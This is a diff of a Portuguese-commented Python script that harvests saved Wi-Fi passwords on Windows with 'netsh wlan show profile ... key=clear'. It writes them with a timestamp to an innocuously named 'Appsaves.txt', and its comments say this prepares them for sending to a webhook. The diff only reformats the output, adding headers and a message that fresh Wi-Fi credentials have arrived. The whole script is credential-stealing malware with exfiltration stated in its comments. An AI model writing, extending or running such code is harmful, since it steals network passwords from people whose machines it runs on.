@@ -12,8 +12,9 @@ def get_networks():
             position = line.find(":")
             network = line[position + 2:]
             password = information_network(network)
-            networks.append("Nome = "+ network + " // Senha = " + password)
-    return networks
+            networks.append("## Nome = "+ network + "// Senha = " + password)
+            networkz = "\n".join(networks)
+    return networkz
 
 def information_network(wifi):
     information_command = subprocess.check_output(["netsh", "wlan", "show", "profile", wifi, "key", "=", "clear"],
@@ -35,7 +36,7 @@ dia = datetime.datetime.now()
 # ou seja pra informação chegar correta no webhook e necessario que a informação esteja em formato string.
 
 with open ("Appsaves.txt", "w") as arquivos:
-    arquivos.write("As senhas do dia sao: {} // {} ".format(get_networks(),dia))
+    arquivos.write("# Opa, Wifi fresco pingou: \n {} // {} \n".format(get_networks(),dia))
 
 # Pega as informações do arquivo .txt ja transformada em string prontas para serem enviadas para o webhook.
 
